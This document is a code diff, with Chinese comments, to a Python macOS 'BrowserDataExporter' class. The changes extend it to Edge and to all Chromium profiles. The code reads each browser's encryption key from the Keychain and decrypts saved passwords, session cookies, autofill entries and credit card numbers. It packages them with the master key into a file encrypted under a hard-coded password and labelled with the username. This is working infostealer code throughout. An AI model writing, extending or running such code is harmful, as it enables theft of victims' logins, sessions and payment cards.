@@ -67,7 +67,7 @@ class BrowserDataExporter:
         # 浏览器 User Data 根目录（支持多个 Profile）
         self.browsers = {
             "Chrome": os.path.join(home, "Library", "Application Support", "Google", "Chrome"),
-            "Safari": os.path.join(home, "Library", "Safari"),  # Safari 不使用 Profile
+            "Edge": os.path.join(home, "Library", "Application Support", "Microsoft Edge"),
             "Brave": os.path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser"),
         }
         if output_dir is None:
@@ -78,6 +78,33 @@ class BrowserDataExporter:
         else:
             self.output_dir = Path(output_dir)
         self.output_dir.mkdir(parents=True, exist_ok=True)
+
+    def get_available_profiles(self, user_data_dir):
+        """返回存在的 Chromium Profile，Default 始终排在最前。"""
+        profiles = []
+        if not os.path.exists(user_data_dir):
+            return profiles
+        try:
+            for item in os.listdir(user_data_dir):
+                item_path = os.path.join(user_data_dir, item)
+                if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
+                    profiles.append((item, item_path))
+        except OSError as e:
+            logging.debug(f"扫描 Profile 失败: {e}")
+        return sorted(profiles, key=lambda profile: (profile[0] != "Default", profile[0]))
+
+    @staticmethod
+    def build_browser_payload(profiles, master_key):
+        """构建与独立导入器兼容的浏览器载荷。"""
+        return {
+            "profiles": profiles,
+            "master_key": base64.b64encode(master_key).decode("utf-8"),
+            "total_cookies": sum(len(profile.get("cookies", [])) for profile in profiles.values()),
+            "total_passwords": sum(len(profile.get("passwords", [])) for profile in profiles.values()),
+            "total_autofill": sum(len(profile.get("autofill", [])) for profile in profiles.values()),
+            "total_credit_cards": sum(len(profile.get("credit_cards", [])) for profile in profiles.values()),
+            "profiles_count": len(profiles),
+        }
     
     def get_master_key(self, browser_name):
         """获取浏览器主密钥（从 macOS Keychain）"""
@@ -85,46 +112,19 @@ class BrowserDataExporter:
             return None
             
         try:
-            # Safari 不使用主密钥加密（使用系统 Keychain 直接存储）
-            if browser_name == "Safari":
-                return None  # Safari 使用不同的机制
-            
-            # Chrome/Brave 的密钥存储在 Keychain 中
             keychain_names = {
-                "Chrome": "Chrome Safe Storage",
-                "Brave": "Brave Safe Storage",
+                "Chrome": [("Chrome Safe Storage", "Chrome"), ("Chrome Safe Storage", "")],
+                "Edge": [("Microsoft Edge Safe Storage", "Microsoft Edge"), ("Microsoft Edge Safe Storage", "Edge")],
+                "Brave": [("Brave Safe Storage", "Brave"), ("Brave Safe Storage", "")],
             }
-            
-            service_name = keychain_names.get(browser_name, "Chrome Safe Storage")
-            
-            # 使用 security 命令从 Keychain 获取密钥
-            cmd = [
-                'security',
-                'find-generic-password',
-                '-w',  # 只输出密码
-                '-s', service_name,  # service name
-                '-a', browser_name  # account name
-            ]
-            
-            result = subprocess.run(cmd, capture_output=True, text=True)
-            if result.returncode == 0:
-                password = result.stdout.strip()
-                # Chrome/Edge/Brave 使用 "peanuts" 作为密码的情况（某些版本）
-                if not password:
-                    password = "peanuts"
-                
-                # 使用 PBKDF2 派生密钥
-                salt = b'saltysalt'
-                iterations = 1003
-                key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
-                return key
-            else:
-                # 如果 Keychain 中没有，使用默认密码
-                password = "peanuts"
-                salt = b'saltysalt'
-                iterations = 1003
-                key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
-                return key
+            for service_name, account_name in keychain_names.get(browser_name, []):
+                cmd = ['security', 'find-generic-password', '-w', '-s', service_name]
+                if account_name:
+                    cmd.extend(['-a', account_name])
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
+                if result.returncode == 0 and result.stdout.strip():
+                    return PBKDF2(result.stdout.strip().encode('utf-8'), b'saltysalt', dkLen=16, count=1003)
+            return PBKDF2(b'peanuts', b'saltysalt', dkLen=16, count=1003)
         except (subprocess.SubprocessError, OSError, ValueError) as e:
             logging.error(f"❌ 获取 {browser_name} 主密钥失败: {e}")
             return None
@@ -173,6 +173,9 @@ class BrowserDataExporter:
     
     def safe_copy_locked_file(self, source_path, dest_path, max_retries=3):
         """安全复制被锁定的文件（浏览器运行时）"""
+        # SQLite 在线备份优先，避免复制正在写入的数据库快照。
+        if self.sqlite_online_backup(source_path, dest_path):
+            return True
         for attempt in range(max_retries):
             try:
                 shutil.copy2(source_path, dest_path)
@@ -583,6 +586,63 @@ class BrowserDataExporter:
         
         return web_data
     
+    def export_web_data(self, browser_name, browser_path, master_key, profile_name=None):
+        """导出可被独立导入器恢复的自动填充和信用卡记录。"""
+        web_data_path = os.path.join(browser_path, "Web Data")
+        if not os.path.exists(web_data_path):
+            return [], []
+
+        profile_suffix = f"_{profile_name}" if profile_name else ""
+        temp_web_data = os.path.join(self.output_dir, f"temp_{browser_name}{profile_suffix}_web_data.db")
+        if not self.safe_copy_locked_file(web_data_path, temp_web_data):
+            return [], []
+
+        autofill, credit_cards = [], []
+        try:
+            conn = sqlite3.connect(temp_web_data)
+            cursor = conn.cursor()
+
+            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='autofill'")
+            if cursor.fetchone():
+                cursor.execute("PRAGMA table_info(autofill)")
+                columns = {row[1] for row in cursor.fetchall()}
+                fields = [field for field in ("name", "value", "date_created", "date_last_used", "count") if field in columns]
+                if "name" in columns and "value" in columns:
+                    cursor.execute(f"SELECT {','.join(fields)} FROM autofill")
+                    autofill = [dict(zip(fields, row)) for row in cursor.fetchall()]
+
+            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='credit_cards'")
+            if cursor.fetchone():
+                cursor.execute("PRAGMA table_info(credit_cards)")
+                columns = {row[1] for row in cursor.fetchall()}
+                fields = [field for field in (
+                    "guid", "name_on_card", "expiration_month", "expiration_year",
+                    "card_number_encrypted", "date_modified", "use_count", "use_date",
+                    "billing_address_id", "nickname", "card_issuer", "instrument_id",
+                    "virtual_card_enrollment_state", "card_art_url", "product_description",
+                ) if field in columns]
+                if "card_number_encrypted" in columns:
+                    cursor.execute(f"SELECT {','.join(fields)} FROM credit_cards")
+                    for row in cursor.fetchall():
+                        card = dict(zip(fields, row))
+                        encrypted_number = card.pop("card_number_encrypted", None)
+                        if isinstance(encrypted_number, str):
+                            encrypted_number = encrypted_number.encode("latin1")
+                        number = self.decrypt_payload(encrypted_number, master_key)
+                        if number:
+                            card["number"] = number
+                            credit_cards.append(card)
+            conn.close()
+        except (sqlite3.Error, OSError, UnicodeDecodeError) as e:
+            logging.debug(f"导出 Web Data 失败: {e}")
+        finally:
+            if os.path.exists(temp_web_data):
+                try:
+                    os.remove(temp_web_data)
+                except Exception:
+                    pass
+        return autofill, credit_cards
+
     def encrypt_export_data(self, data, password):
         """加密导出数据"""
         if not CRYPTO_AVAILABLE:
@@ -774,6 +834,70 @@ class BrowserDataExporter:
         logging.info("🔒 文件已加密（密码已设置）")
         logging.info("="*60)
         
+        return str(output_file)
+
+    def export_all(self):
+        """导出所有 Chromium 浏览器数据。"""
+        if not CRYPTO_AVAILABLE:
+            logging.error("❌ 需要安装 pycryptodome: pip3 install pycryptodome")
+            return None
+
+        username = getpass.getuser()
+        user_prefix = username[:5] if username else "user"
+        all_data = {
+            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "username": username,
+            "platform": "macOS",
+            "browsers": {},
+        }
+
+        for browser_name, user_data_path in self.browsers.items():
+            if not os.path.exists(user_data_path):
+                logging.info(f"⏭️  跳过 {browser_name}（未安装）")
+                continue
+            logging.info(f"\n📦 处理 {browser_name}...")
+            master_key = self.get_master_key(browser_name)
+            if not master_key:
+                logging.warning(f"⚠️  无法获取 {browser_name} 主密钥，将跳过加密数据解密")
+                continue
+
+            profiles = self.get_available_profiles(user_data_path)
+            if not profiles:
+                logging.warning(f"⚠️  {browser_name} 未找到任何 Profile")
+                continue
+
+            browser_profiles = {}
+            for profile_name, profile_path in profiles:
+                cookies = self.export_cookies(browser_name, profile_path, master_key, profile_name)
+                passwords = self.export_passwords(browser_name, profile_path, master_key, profile_name)
+                autofill, credit_cards = self.export_web_data(browser_name, profile_path, master_key, profile_name)
+                if cookies or passwords or autofill or credit_cards:
+                    browser_profiles[profile_name] = {
+                        "cookies": cookies,
+                        "passwords": passwords,
+                        "autofill": autofill,
+                        "credit_cards": credit_cards,
+                        "cookies_count": len(cookies),
+                        "passwords_count": len(passwords),
+                        "web_data_count": len(autofill) + len(credit_cards),
+                        "credit_cards_count": len(credit_cards),
+                        "autofill_count": len(autofill),
+                    }
+
+            if browser_profiles:
+                all_data["browsers"][browser_name] = self.build_browser_payload(browser_profiles, master_key)
+
+        if not all_data["browsers"]:
+            logging.warning("⚠️ 没有可导出的浏览器数据")
+            return None
+
+        encrypted_data = self.encrypt_export_data(all_data, "cookies2026")
+        if not encrypted_data:
+            return None
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        output_file = self.output_dir / f"{user_prefix}_browser_data_{timestamp}.encrypted"
+        with open(output_file, "w", encoding="utf-8") as f:
+            json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
         return str(output_file)
 
 
